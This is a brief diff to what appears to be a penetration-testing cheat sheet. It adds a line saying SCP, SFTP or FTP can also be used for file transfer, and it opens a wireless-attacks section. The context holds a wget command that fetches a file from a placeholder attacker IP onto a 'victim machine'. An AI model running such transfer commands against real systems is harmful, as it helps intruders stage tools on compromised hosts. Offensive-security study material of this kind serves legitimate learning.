@@ -234,6 +234,8 @@ To check for files in the conversations use export option. File -> Export -> HTT
 
 ```wget http://[ATTACKING_IP]:9000/[filename]``` - Use on victim machine to download.
 
+OR use SCP, SFTP or FTP protocols.
+
 # Wireless Attacks
 <details>
 <summary>aircrack-ng</summary>
